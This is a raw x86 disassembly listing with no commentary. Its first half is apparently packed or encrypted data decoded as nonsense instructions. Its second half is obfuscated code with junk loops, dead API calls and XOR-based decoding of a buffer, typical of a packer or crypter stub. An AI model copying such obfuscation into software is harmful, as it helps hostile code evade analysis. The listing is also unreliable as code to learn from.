  40f468:	jmp    0x40f45b
  40f46a:	shr    DWORD PTR [ebp-0x5c],cl
  40f46d:	push   esi
  40f46e:	xchg   ebx,eax
  40f46f:	mov    ch,0xc9
  40f471:	and    bh,ch
  40f473:	mov    ch,0xf1
  40f475:	dec    eax
  40f476:	inc    ebp
  40f477:	mov    dh,0xbd
  40f479:	adc    al,0x54
  40f47b:	push   esi
  40f47c:	inc    ebx
  40f47d:	jne    0x40f454
  40f47f:	stos   BYTE PTR es:[edi],al
  40f480:	cmp    eax,0xd5780a0c
  40f485:	mov    esi,0x18f092c
  40f48a:	jge    0x40f4d4
  40f48c:	es retf 0xa60f
  40f490:	adc    al,0xc1
  40f492:	inc    ebp
  40f493:	fdiv   DWORD PTR [edx-0x7555daf0]
  40f499:	push   ss
  40f49a:	out    0x3d,al
  40f49c:	inc    ebx
  40f49d:	push   esi
  40f49e:	inc    eax
  40f49f:	push   ecx
  40f4a0:	idiv   BYTE PTR [edx+ebp*2+0x1c4c95e2]
  40f4a7:	(bad)  
  40f4a8:	inc    ebp
  40f4a9:	and    cl,bl
  40f4ab:	mov    esi,0x576f5712
  40f4b0:	imul   ecx,esp,0x7
  40f4b3:	iret   
  40f4b4:	leave  
  40f4b5:	mov    al,dh
  40f4b7:	xchg   edi,eax
  40f4b8:	scas   al,BYTE PTR es:[edi]
  40f4b9:	test   BYTE PTR [eax+0x56],bl
  40f4bc:	aaa    
  40f4bd:	push   cs
  40f4be:	add    edi,DWORD PTR [ecx+0x69]
  40f4c1:	or     ch,al
  40f4c3:	int    0x1f
  40f4c5:	or     al,0x49
  40f4c7:	ss out 0xeb,eax
  40f4ca:	rcl    DWORD PTR [edx+0x51],cl
  40f4cd:	cld    
  40f4ce:	mov    ebx,0x4934f92c
  40f4d3:	mov    ch,0xa9
  40f4d5:	sbb    al,0xc4
  40f4d7:	pop    esi
  40f4d8:	dec    esi
  40f4d9:	inc    BYTE PTR [edx*2+0x36a06696]
  40f4e0:	jg     0x40f4d1
  40f4e2:	jle    0x40f470
  40f4e4:	push   0xfffffffb
  40f4e6:	or     DWORD PTR [eax-0x22],0x830299db
  40f4ed:	add    edi,DWORD PTR [edi-0xe25d024]
  40f4f3:	(bad)  
  40f4f4:	xor    al,ah
  40f4f6:	loopne 0x40f565
  40f4f8:	xor    eax,0xd13ba4de
  40f4fd:	sbb    dh,0x40
  40f500:	ins    DWORD PTR es:[edi],dx
  40f501:	(bad)  [edx-0x5a6d1baf]
  40f507:	add    ebp,DWORD PTR [ebp+0x19]
  40f50a:	cmp    al,0x7a
  40f50c:	add    edi,ebp
  40f50e:	repz jge 0x40f580
  40f511:	cmp    eax,0x1863d56a
  40f516:	jmp    0x40f506
  40f518:	je     0x40f575
  40f51a:	lock nop
  40f51c:	aaa    
  40f51d:	mov    esp,0xb6bfeaf0
  40f522:	add    eax,0x11836380
  40f527:	outs   dx,BYTE PTR ds:[esi]
  40f528:	add    BYTE PTR [eax],dh
  40f52a:	sbb    DWORD PTR [edi],edx
  40f52c:	loope  0x40f535
  40f52e:	dec    edx
  40f52f:	out    0xe5,al
  40f531:	dec    edi
  40f532:	mov    ?,WORD PTR [edi-0x15]
  40f535:	add    bl,dl
  40f537:	dec    edx
  40f538:	jae    0x4160f260
  40f53e:	cmp    eax,0x9aa28871
  40f543:	inc    ebp
  40f544:	pop    ebx
  40f545:	(bad)  
  40f546:	xchg   ebp,eax
  40f547:	adc    BYTE PTR [edx+eiz*8-0x1f],al
  40f54b:	push   esp
  40f54c:	mov    ?,WORD PTR gs:[edx-0x68]
  40f550:	repz or eax,0xfec65628
  40f556:	mov    ah,BYTE PTR [ebx+0x8a53c4e]
  40f55c:	fsub   QWORD PTR [eax+0x26941f12]
  40f562:	mov    cl,cl
  40f564:	aaa    
  40f565:	aad    0xb7
  40f567:	std    
  40f568:	xchg   esp,eax
  40f569:	call   0xef93f38b
  40f56e:	and    edx,DWORD PTR [edx]
  40f570:	xor    dh,BYTE PTR [eax-0x4db599ac]
  40f576:	daa    
  40f577:	(bad)  
  40f578:	scas   al,BYTE PTR es:[edi]
  40f579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f57a:	pop    esp
  40f57b:	add    eax,0x4218ec9d
  40f580:	cmp    al,0xe5
  40f582:	jb     0x40f5e9
  40f584:	outs   dx,BYTE PTR ds:[esi]
  40f585:	call   0x5fd31721
  40f58a:	movhps QWORD PTR ds:0x9827016,xmm2
  40f591:	adc    BYTE PTR ds:[ebp+0xd],ch
  40f595:	adc    al,0xfa
  40f597:	fmul   DWORD PTR [edx+0x3e]
  40f59a:	and    eax,0xd9180b91
  40f59f:	imul   ecx,DWORD PTR [edi+edx*2],0x5d
  40f5a3:	sub    DWORD PTR fs:[esi],ebx
  40f5a6:	jmp    0x40f591
  40f5a8:	push   0x70
  40f5aa:	mov    DWORD PTR [edi],0x2e8f3493
  40f5b0:	jp     0x40f5d6
  40f5b2:	add    DWORD PTR [esi-0x5],ebp
  40f5b5:	adc    eax,DWORD PTR [eax]
  40f5b7:	pop    ss
  40f5b8:	inc    ebp
  40f5b9:	ret    
  40f5ba:	in     al,dx
  40f5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5bc:	or     eax,0x215e1f8a
  40f5c1:	fadd   st,st(7)
  40f5c3:	int    0x6
  40f5c5:	outs   dx,BYTE PTR ds:[esi]
  40f5c6:	inc    eax
  40f5c7:	xchg   edx,eax
  40f5c8:	bound  ebp,QWORD PTR [edx-0x1a]
  40f5cb:	dec    ecx
  40f5cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5cd:	lods   eax,DWORD PTR ds:[esi]
  40f5ce:	rol    DWORD PTR [eax-0x5e236194],cl
  40f5d4:	cmp    eax,0x3a5885a3
  40f5d9:	test   eax,0xfba11079
  40f5de:	outs   dx,BYTE PTR ds:[esi]
  40f5df:	and    eax,0x69761ae1
  40f5e4:	and    BYTE PTR [edi+0x4c],cl
  40f5e7:	mov    dh,BYTE PTR [ebx+0x29a44212]
  40f5ed:	lock loope 0x40f64c
  40f5f0:	fnstsw WORD PTR [ebp-0x1f]
  40f5f3:	lea    edi,[esi-0x56]
  40f5f6:	xor    DWORD PTR [ebx],ecx
  40f5f8:	mov    eax,0xbb290e19
  40f5fd:	(bad)  
  40f5fe:	xlat   BYTE PTR ds:[ebx]
  40f5ff:	cmp    eax,0x5747b656
  40f604:	mov    ch,0xff
  40f606:	outs   dx,DWORD PTR ds:[esi]
  40f607:	ins    BYTE PTR es:[edi],dx
  40f608:	retf   
  40f609:	cmp    dh,BYTE PTR [ebp-0x2423edac]
  40f60f:	imul   ebp,DWORD PTR [esi-0x5d],0x30
  40f613:	mov    ds:0xa05ddcc3,al
  40f618:	adc    esi,DWORD PTR [edi]
  40f61a:	js     0x40f646
  40f61c:	inc    edx
  40f61d:	pop    esp
  40f61e:	xchg   edi,eax
  40f61f:	and    ebx,esi
  40f621:	aad    0x8c
  40f623:	inc    ebp
  40f624:	leave  
  40f625:	fs stc 
  40f627:	adc    bh,BYTE PTR [esi+0x69]
  40f62a:	xchg   edi,eax
  40f62b:	cmp    cl,bl
  40f62d:	mov    esi,0x898cecb5
  40f632:	in     eax,dx
  40f633:	cmp    edi,DWORD PTR [esi]
  40f635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f636:	xchg   ecx,eax
  40f637:	push   cs
  40f638:	rcr    ebp,1
  40f63a:	sub    BYTE PTR [ecx],dh
  40f63c:	mov    ch,0xf2
  40f63e:	xchg   DWORD PTR [esp+ecx*4],ebp
  40f641:	adc    DWORD PTR [ebp-0x71c5f982],ecx
  40f647:	mov    ebx,0x9cdb90ad
  40f64c:	xchg   ebx,eax
  40f64d:	dec    edi
  40f64e:	mov    ch,0x95
  40f650:	xchg   esi,eax
  40f651:	fnsave [ebp+0x70b126d8]
  40f657:	ss scas eax,DWORD PTR es:[edi]
  40f659:	jbe    0x40f62e
  40f65b:	or     esp,DWORD PTR [eax-0x3c57a75f]
  40f661:	daa    
  40f662:	xor    al,0x4e
  40f664:	sbb    al,BYTE PTR [ecx]
  40f666:	and    DWORD PTR [eax+0x2f6579ec],0x667fa1df
  40f670:	fs rcl cl,1
  40f673:	outs   dx,DWORD PTR ds:[esi]
  40f674:	sbb    eax,edx
  40f676:	or     esp,edi
  40f678:	sub    BYTE PTR [edx+0x14526020],al
  40f67e:	add    DWORD PTR [ebx],edx
  40f680:	adc    eax,0xc7b6d667
  40f685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f686:	xlat   BYTE PTR ds:[ebx]
  40f687:	sbb    BYTE PTR [esi],cl
  40f689:	pop    edi
  40f68a:	leave  
  40f68b:	mov    esp,0x8843ca51
  40f690:	ins    BYTE PTR es:[edi],dx
  40f691:	jge    0x40f6f1
  40f693:	dec    esp
  40f694:	push   0xffffffe8
  40f696:	sbb    al,0x1b
  40f698:	sub    al,0x2c
  40f69a:	mov    cl,0x5b
  40f69c:	dec    eax
  40f69d:	xor    ch,BYTE PTR [ecx-0x18]
  40f6a0:	aam    0x4e
  40f6a2:	aam    0x53
  40f6a4:	mov    ?,esi
  40f6a6:	mov    al,ds:0xd4aabaa4
  40f6ab:	out    0xd,al
  40f6ad:	popa   
  40f6ae:	js     0x40f6c5
  40f6b0:	repnz add eax,0x194067f2
  40f6b6:	pop    es
  40f6b7:	sbb    eax,0x69ca22aa
  40f6bc:	cmp    eax,0x6f64a8e4
  40f6c1:	push   esi
  40f6c2:	jle    0x40f737
  40f6c4:	inc    edi
  40f6c5:	mov    ch,0xea
  40f6c7:	int    0x59
  40f6c9:	(bad)  [ebx+0x6659ab8f]
  40f6cf:	pop    ecx
  40f6d0:	(bad)  
  40f6d1:	cmp    DWORD PTR [ebp+0x16fbca22],eax
  40f6d7:	xor    esi,ecx
  40f6d9:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40f6db:	enter  0x6304,0x2c
  40f6df:	in     al,0x75
  40f6e1:	jge    0x40f706
  40f6e3:	cmp    DWORD PTR [ecx+0x634f4a26],esi
  40f6e9:	jmp    0x1727:0x3c6a5095
  40f6f0:	xchg   esi,eax
  40f6f1:	ds (bad) 
  40f6f5:	add    al,0x3a
  40f6f7:	outs   dx,BYTE PTR ds:[esi]
  40f6f8:	ins    BYTE PTR es:[edi],dx
  40f6f9:	addr16 mov al,0x90
  40f6fc:	adc    al,0x45
  40f6fe:	fist   DWORD PTR [ebp+0x9]
  40f701:	cmp    DWORD PTR [edi],0xef04aa91
  40f707:	and    esi,edx
  40f709:	aaa    
  40f70a:	adc    al,0x50
  40f70c:	retf   
  40f70d:	jno    0x40f6cf
  40f70f:	mov    BYTE PTR [esi],bh
  40f711:	out    dx,al
  40f712:	dec    edi
  40f713:	cmp    al,BYTE PTR [ebx]
  40f715:	sbb    ebx,DWORD PTR [edx-0x25]
  40f718:	clc    
  40f719:	scas   al,BYTE PTR es:[edi]
  40f71a:	mov    edx,0x2b3ad4e2
  40f71f:	sub    DWORD PTR [edx+0x47],edx
  40f722:	jg     0x40f78d
  40f724:	outs   dx,BYTE PTR ds:[esi]
  40f725:	xor    DWORD PTR [eax-0x1a4d8e16],ebx
  40f72b:	bound  ebx,QWORD PTR [edi]
  40f72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f72e:	outs   dx,BYTE PTR ds:[esi]
  40f72f:	push   edi
  40f730:	dec    esp
  40f731:	xor    edi,DWORD PTR ds:0x7719f72c
  40f737:	lahf   
  40f738:	into   
  40f739:	inc    ecx
  40f73a:	arpl   ax,cx
  40f73c:	js     0x40f727
  40f73e:	jo     0x40f749
  40f740:	(bad)  
  40f741:	jle    0x40f71e
  40f743:	sub    edi,DWORD PTR [edi+0x66ff54f]
  40f749:	imul   esp,DWORD PTR [eax],0x0
  40f74c:	ret    0xab06
  40f74f:	aaa    
  40f750:	cld    
  40f751:	add    esp,eax
  40f753:	xchg   edx,eax
  40f754:	push   eax
  40f755:	xor    ebx,ebx
  40f757:	mov    edx,esp
  40f759:	dec    edx
  40f75a:	inc    ebx
  40f75b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f75e:	dec    ebx
  40f75f:	xor    edx,edx
  40f761:	add    DWORD PTR [ebp-0x10],ebx
  40f764:	pop    ebx
  40f765:	mov    eax,DWORD PTR [ebp-0x10]
  40f768:	pop    edi
  40f769:	pop    esi
  40f76a:	pop    ebx
  40f76b:	leave  
  40f76c:	ret    0x10
  40f76f:	push   ebp
  40f770:	mov    ebp,esp
  40f772:	push   ecx
  40f773:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40f77a:	mov    ecx,DWORD PTR ds:0x42b26e
  40f780:	mov    edx,DWORD PTR ds:0x42b2da
  40f786:	sub    edx,ecx
  40f788:	xor    ecx,DWORD PTR [ecx+edx*1]
  40f78b:	mov    eax,DWORD PTR [ebp-0x4]
  40f78e:	and    DWORD PTR ds:0x42b226,0x0
  40f798:	mov    edx,DWORD PTR ds:0x42b226
  40f79e:	inc    edx
  40f79f:	mov    DWORD PTR ds:0x42b226,edx
  40f7a5:	cmp    DWORD PTR ds:0x42b226,0xb
  40f7ac:	jb     0x40f7f2
  40f7b2:	jmp    0x40f7cb
  40f7b7:	push   DWORD PTR [ebp-0x24]
  40f7ba:	push   DWORD PTR [ebp-0x24]
  40f7bd:	push   0x42a23f
  40f7c2:	push   DWORD PTR [ebp-0x1c]
  40f7c5:	call   DWORD PTR ds:0x42b306
  40f7cb:	cmp    DWORD PTR ds:0x42b226,0xa
  40f7d2:	jne    0x40f7e5
  40f7d8:	mov    edx,DWORD PTR ds:0x42b226
  40f7de:	inc    edx
  40f7df:	mov    DWORD PTR ds:0x42b226,edx
  40f7e5:	cmp    DWORD PTR ds:0x42b226,0x17
  40f7ec:	jb     0x40f798
  40f7f2:	mov    edx,DWORD PTR [ebp+0x10]
  40f7f5:	mov    ecx,0x75108ae
  40f7fa:	add    DWORD PTR ds:0x42b1ea,0x1734
  40f804:	xor    eax,ecx
  40f806:	add    eax,0x3272f5
  40f80b:	mov    DWORD PTR [edx],eax
  40f80d:	mov    eax,DWORD PTR [ebp+0xc]
  40f810:	xor    eax,ecx
  40f812:	push   esi
  40f813:	mov    esi,DWORD PTR [ebp+0x10]
  40f816:	mov    edx,0x3272f5
  40f81b:	add    eax,edx
  40f81d:	mov    DWORD PTR [esi+0x4],eax
  40f820:	mov    eax,DWORD PTR [ebp+0x14]
  40f823:	mov    esi,DWORD PTR [ebp+0x10]
  40f826:	mov    DWORD PTR [esi+0x8],eax
  40f829:	mov    eax,DWORD PTR [ebp+0x18]
  40f82c:	mov    esi,DWORD PTR [ebp+0x10]
  40f82f:	mov    DWORD PTR [esi+0xc],eax
  40f832:	mov    eax,DWORD PTR [ebp+0x1c]
  40f835:	mov    esi,DWORD PTR [ebp+0x10]
  40f838:	mov    DWORD PTR [esi+0x10],eax
  40f83b:	mov    eax,DWORD PTR [ebp+0x8]
  40f83e:	xor    eax,ecx
  40f840:	add    eax,edx
  40f842:	pop    esi
  40f843:	leave  
  40f844:	ret    0x18
  40f847:	push   ebp
  40f848:	mov    ebp,esp
  40f84a:	sub    esp,0x9c
  40f850:	and    DWORD PTR ds:0x42b1b6,0x0
  40f85a:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f860:	inc    ecx
  40f861:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f867:	cmp    DWORD PTR ds:0x42b1b6,0xd
  40f86e:	ja     0x40f8b2
  40f874:	jmp    0x40f88b
  40f879:	push   0x42a1d7
  40f87e:	push   0x0
  40f880:	push   0x7b23
  40f885:	call   DWORD PTR ds:0x42b30e
  40f88b:	cmp    DWORD PTR ds:0x42b1b6,0xc
  40f892:	jne    0x40f8a5
  40f898:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f89e:	inc    ecx
  40f89f:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f8a5:	cmp    DWORD PTR ds:0x42b1b6,0x14
  40f8ac:	jb     0x40f85a
  40f8b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8b5:	xor    eax,DWORD PTR ds:0x42b1a6
  40f8bb:	mov    eax,0x8a9a
  40f8c0:	xor    ax,WORD PTR [ecx+0x20]
  40f8c4:	xor    DWORD PTR ds:0x42b1d6,ebx
  40f8ca:	mov    ecx,0x3b5c
  40f8cf:	adc    DWORD PTR ds:0x42b206,0x42b22e
  40f8d9:	add    ax,cx
  40f8dc:	and    DWORD PTR ds:0x42b1ba,0x0
  40f8e6:	mov    ecx,DWORD PTR ds:0x42b1ba
  40f8ec:	inc    ecx
  40f8ed:	mov    DWORD PTR ds:0x42b1ba,ecx
  40f8f3:	cmp    DWORD PTR ds:0x42b1ba,0x1e
  40f8fa:	jge    0x40f91b
  40f900:	jmp    0x40f90e
  40f905:	push   DWORD PTR [ebp-0x20]
  40f908:	call   DWORD PTR ds:0x42b316
  40f90e:	cmp    DWORD PTR ds:0x42b1ba,0x19
  40f915:	jb     0x40f8e6
  40f91b:	movzx  eax,ax
  40f91e:	or     ecx,DWORD PTR ds:0x42b1fa
  40f924:	mov    DWORD PTR [ebp-0x10],eax
  40f927:	and    DWORD PTR ds:0x42b1a2,0x5305
  40f931:	mov    BYTE PTR [ebp-0x1],0x80
  40f935:	mov    ecx,DWORD PTR ds:0x42b22a
  40f93b:	sub    DWORD PTR ds:0x42b1f6,ecx
  40f941:	lea    eax,[ebp-0x1]
  40f944:	mov    DWORD PTR ds:0x42b21e,0x14
  40f94e:	cmp    DWORD PTR ds:0x42b21e,0x0
  40f955:	je     0x40f9a6
  40f95b:	cmp    DWORD PTR ds:0x42b21e,0x4
  40f962:	ja     0x40f9a6
  40f968:	jmp    0x40f97a
  40f96d:	push   0x5
  40f96f:	push   0x6029
  40f974:	call   DWORD PTR ds:0x42b31a
  40f97a:	cmp    DWORD PTR ds:0x42b21e,0x5
  40f981:	jne    0x40f994
  40f987:	mov    ecx,DWORD PTR ds:0x42b21e
  40f98d:	dec    ecx
  40f98e:	mov    DWORD PTR ds:0x42b21e,ecx
  40f994:	mov    ecx,DWORD PTR ds:0x42b21e
  40f99a:	dec    ecx
  40f99b:	mov    DWORD PTR ds:0x42b21e,ecx
  40f9a1:	jmp    0x40f94e
  40f9a6:	mov    DWORD PTR [ebp-0xc],eax
  40f9a9:	or     ecx,DWORD PTR ds:0x42b212
  40f9af:	mov    al,BYTE PTR [ebp-0x1]
  40f9b2:	xor    DWORD PTR ds:0x42b226,0x485
  40f9bc:	mov    ecx,DWORD PTR [ebp-0xc]
  40f9bf:	xor    al,0x7e
  40f9c1:	add    al,0x3
  40f9c3:	and    DWORD PTR ds:0x42b20a,0x20b6
  40f9cd:	mov    BYTE PTR [ecx],al
  40f9cf:	sbb    ecx,0x5f8e
  40f9d5:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  40f9dc:	push   ebx
  40f9dd:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  40f9e4:	and    DWORD PTR ds:0x42b1da,0x0
  40f9ee:	jmp    0x40f9fe
  40f9f3:	mov    eax,ds:0x42b1da
  40f9f8:	inc    eax
  40f9f9:	mov    ds:0x42b1da,eax
  40f9fe:	cmp    DWORD PTR ds:0x42b1da,0x14
  40fa05:	jae    0x40fa55
  40fa0b:	cmp    DWORD PTR ds:0x42b1da,0xb
  40fa12:	jbe    0x40fa55
  40fa18:	jmp    0x40fa35
  40fa1d:	push   0x42b1f2
  40fa22:	push   DWORD PTR [ebp-0xc]
  40fa25:	push   0x42a000
  40fa2a:	push   0x42a18d
  40fa2f:	call   DWORD PTR ds:0x42b31e
  40fa35:	cmp    DWORD PTR ds:0x42b1da,0xa
  40fa3c:	jne    0x40fa50
  40fa42:	xor    eax,eax
  40fa44:	xor    eax,DWORD PTR ds:0x42b1da
  40fa4a:	inc    eax
  40fa4b:	mov    ds:0x42b1da,eax
  40fa50:	jmp    0x40f9f3
  40fa55:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa58:	sub    DWORD PTR ds:0x42b1fa,0x685a
  40fa62:	push   esi
  40fa63:	dec    esi
  40fa64:	mov    eax,0x75108ae
  40fa69:	and    DWORD PTR ds:0x42b1b2,0x4a0b
  40fa73:	xor    ecx,eax
  40fa75:	or     DWORD PTR ds:0x42b212,ebx
  40fa7b:	mov    esi,0x3272f5
  40fa80:	adc    DWORD PTR ds:0x42b216,0x42b222
  40fa8a:	push   edi
  40fa8b:	and    DWORD PTR ds:0x42b19a,0x42b1a2
  40fa95:	add    ecx,esi
  40fa97:	mov    DWORD PTR ds:0x42b212,0x27f7
  40faa1:	jmp    0x40facf
  40faa6:	mov    DWORD PTR ds:0x42b1a2,0x4c70
  40fab0:	mov    dl,BYTE PTR [ebp-0x1]
  40fab3:	mov    DWORD PTR ds:0x42b1da,0x7ef5
  40fabd:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40fac4:	mov    DWORD PTR ds:0x42b21a,0x736d
  40face:	inc    ecx
  40facf:	mov    DWORD PTR ds:0x42b1b2,0x61ef
  40fad9:	cmp    ecx,0x40
  40fadc:	jb     0x40faa6
  40fae2:	sbb    edx,DWORD PTR ds:0x42b1de
  40fae8:	mov    edx,DWORD PTR [ebp-0x18]
  40faeb:	adc    DWORD PTR ds:0x42b18e,0x3f3e
  40faf5:	xor    edx,eax
  40faf7:	sub    DWORD PTR ds:0x42b1d2,0x42b1ce
  40fb01:	add    edx,esi
  40fb03:	jmp    0x40fbc0
  40fb08:	mov    edi,DWORD PTR [ebp+0x8]
  40fb0b:	mov    ecx,0x8a9a
  40fb10:	sbb    DWORD PTR ds:0x42b1e6,0x42b226
  40fb1a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40fb1f:	adc    DWORD PTR ds:0x42b1de,ecx
  40fb25:	mov    edi,0x3b5c
  40fb2a:	xor    DWORD PTR ds:0x42b1ca,0x42b1a2
  40fb34:	add    cx,di
  40fb37:	adc    DWORD PTR ds:0x42b1b6,0x7f83
  40fb41:	movzx  ecx,cx
  40fb44:	and    DWORD PTR ds:0x42b1f6,0x42b18a
  40fb4e:	mov    DWORD PTR [ebp-0xc],ecx
  40fb51:	and    DWORD PTR ds:0x42b21a,0x0
  40fb5b:	jmp    0x40fb6d
  40fb60:	mov    ecx,DWORD PTR ds:0x42b21a
  40fb66:	inc    ecx
  40fb67:	mov    DWORD PTR ds:0x42b21a,ecx
  40fb6d:	cmp    DWORD PTR ds:0x42b21a,0x19
  40fb74:	jae    0x40fb9c
  40fb7a:	cmp    DWORD PTR ds:0x42b21a,0x1e
  40fb81:	jge    0x40fb9c
  40fb87:	jmp    0x40fb97
  40fb8c:	push   0x1c76
  40fb91:	call   DWORD PTR ds:0x42b322
  40fb97:	jmp    0x40fb60
  40fb9c:	mov    ecx,DWORD PTR [ebp+0x8]
  40fb9f:	add    DWORD PTR ds:0x42b1d2,0x42b1ea
  40fba9:	movzx  ecx,WORD PTR [ecx+edx*4]
  40fbad:	xor    ecx,0x8a9a
  40fbb3:	add    ecx,edi
  40fbb5:	mov    edi,DWORD PTR [ebp-0xc]
  40fbb8:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fbbf:	inc    edx
  40fbc0:	mov    ecx,0xfa9
  40fbc5:	mov    ecx,DWORD PTR [ebp-0x10]
  40fbc8:	cmp    edx,ecx
  40fbca:	jne    0x40fb08
  40fbd0:	mov    DWORD PTR ds:0x42b186,0x1e
  40fbda:	cmp    DWORD PTR ds:0x42b186,0x0
  40fbe1:	je     0x40fc18
  40fbe7:	cmp    DWORD PTR ds:0x42b186,0x24
  40fbee:	jle    0x40fc18
  40fbf4:	jmp    0x40fc04
  40fbf9:	push   0x7864
  40fbfe:	call   DWORD PTR ds:0x42b326
  40fc04:	xor    ecx,ecx
  40fc06:	add    ecx,DWORD PTR ds:0x42b186
  40fc0c:	dec    ecx
  40fc0d:	mov    DWORD PTR ds:0x42b186,ecx
  40fc13:	jmp    0x40fbda
  40fc18:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc1b:	and    edi,edx
  40fc1d:	mov    edx,DWORD PTR [ebp+0x10]
  40fc20:	and    DWORD PTR ds:0x42b19a,0x0
  40fc2a:	mov    edi,DWORD PTR ds:0x42b19a
  40fc30:	inc    edi
  40fc31:	mov    DWORD PTR ds:0x42b19a,edi
  40fc37:	cmp    DWORD PTR ds:0x42b19a,0x25
  40fc3e:	jge    0x40fc76
  40fc44:	jmp    0x40fc69
  40fc49:	push   0x42a0fe
  40fc4e:	push   0x5d6f
  40fc53:	push   0x13cc
  40fc58:	push   DWORD PTR [ebp-0x1c]
  40fc5b:	push   0x3c54
  40fc60:	push   DWORD PTR [ebp-0x20]
  40fc63:	call   DWORD PTR ds:0x42b2ea
  40fc69:	cmp    DWORD PTR ds:0x42b19a,0x1d
  40fc70:	jb     0x40fc2a
  40fc76:	xor    ecx,eax
  40fc78:	inc    edi
  40fc79:	add    ecx,esi
  40fc7b:	and    DWORD PTR ds:0x42b1b6,0x0
  40fc85:	jmp    0x40fc97
  40fc8a:	mov    edi,DWORD PTR ds:0x42b1b6
  40fc90:	inc    edi
  40fc91:	mov    DWORD PTR ds:0x42b1b6,edi
  40fc97:	cmp    DWORD PTR ds:0x42b1b6,0x10
  40fc9e:	jae    0x40fcea
  40fca4:	cmp    DWORD PTR ds:0x42b1b6,0x6
  40fcab:	jl     0x40fcea
  40fcb1:	jmp    0x40fcc9
  40fcb6:	push   0x42a0fe
  40fcbb:	push   DWORD PTR [ebp-0x14]
  40fcbe:	push   0x1
  40fcc0:	push   DWORD PTR [ebp-0x1c]
  40fcc3:	call   DWORD PTR ds:0x42b2ee
  40fcc9:	cmp    DWORD PTR ds:0x42b1b6,0x5
  40fcd0:	jne    0x40fce5
  40fcd6:	xor    edi,edi
  40fcd8:	xor    edi,DWORD PTR ds:0x42b1b6
  40fcde:	inc    edi
  40fcdf:	mov    DWORD PTR ds:0x42b1b6,edi
  40fce5:	jmp    0x40fc8a
  40fcea:	mov    DWORD PTR [edx],ecx
  40fcec:	xor    ecx,ecx
  40fcee:	mov    ecx,DWORD PTR [ebp-0x18]
  40fcf1:	and    DWORD PTR ds:0x42b1e2,0x0
  40fcfb:	xor    edi,edi
  40fcfd:	xor    edi,DWORD PTR ds:0x42b1e2
  40fd03:	inc    edi
  40fd04:	mov    DWORD PTR ds:0x42b1e2,edi
  40fd0a:	cmp    DWORD PTR ds:0x42b1e2,0x29
  40fd11:	ja     0x40fd32
  40fd17:	jmp    0x40fd25
  40fd1c:	push   DWORD PTR [ebp-0x14]
  40fd1f:	call   DWORD PTR ds:0x42b2f2
  40fd25:	cmp    DWORD PTR ds:0x42b1e2,0x19
  40fd2c:	jb     0x40fcfb
  40fd32:	xor    ecx,eax
  40fd34:	and    edi,0x72ff
  40fd3a:	add    ecx,esi
  40fd3c:	or     DWORD PTR ds:0x42b182,0x54fc
  40fd46:	mov    DWORD PTR [ebp-0xc],ecx
  40fd49:	adc    edi,DWORD PTR ds:0x42b1e6
  40fd4f:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  40fd56:	or     edi,DWORD PTR ds:0x42b226
  40fd5c:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40fd63:	and    DWORD PTR ds:0x42b1ba,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ecx,DWORD PTR ds:0x42b1ba
  40fd78:	inc    ecx
  40fd79:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fd7f:	cmp    DWORD PTR ds:0x42b1ba,0x12
  40fd86:	jae    0x40fdca
  40fd8c:	cmp    DWORD PTR ds:0x42b1ba,0x4
  40fd93:	jle    0x40fdca
  40fd99:	jmp    0x40fda9
  40fd9e:	push   0x42b226
  40fda3:	call   DWORD PTR ds:0x42b2f6
  40fda9:	cmp    DWORD PTR ds:0x42b1ba,0x3
  40fdb0:	jne    0x40fdc5
  40fdb6:	xor    ecx,ecx
  40fdb8:	xor    ecx,DWORD PTR ds:0x42b1ba
  40fdbe:	inc    ecx
  40fdbf:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fdc5:	jmp    0x40fd72
  40fdca:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  40fdd1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fdd4:	mov    DWORD PTR [ebp+0x8],ecx
  40fdd7:	mov    ecx,DWORD PTR [ebp+0x8]
  40fdda:	xor    DWORD PTR ds:0x42b20a,edi
  40fde0:	xor    ecx,eax
  40fde2:	or     edi,DWORD PTR ds:0x42b182
  40fde8:	add    ecx,esi
  40fdea:	mov    ecx,0x242ebf1
  40fdef:	mov    edi,0xf641bf0
  40fdf4:	je     0x419191
  40fdfa:	add    DWORD PTR ds:0x42b1c2,0x6a2f
  40fe04:	mov    edx,DWORD PTR [ebp+0x8]
  40fe07:	mov    ebx,DWORD PTR ds:0x42b1aa
  40fe0d:	and    ebx,DWORD PTR ds:0x42b1f2
  40fe13:	mov    DWORD PTR ds:0x42b1aa,ebx
  40fe19:	mov    ebx,DWORD PTR [ebp-0x8]
  40fe1c:	xor    edx,eax
  40fe1e:	xor    ebx,eax
  40fe20:	xor    DWORD PTR ds:0x42b1e6,0x42b196
  40fe2a:	sub    edx,ebx
  40fe2c:	sub    edx,esi
  40fe2e:	mov    DWORD PTR ds:0x42b1ce,0x13
  40fe38:	cmp    DWORD PTR ds:0x42b1ce,0x0
  40fe3f:	je     0x40fe81
  40fe45:	cmp    DWORD PTR ds:0x42b1ce,0x1c
  40fe4c:	jb     0x40fe81
  40fe52:	jmp    0x40fe6f
  40fe57:	push   0x42b1ca
  40fe5c:	push   0x42b196
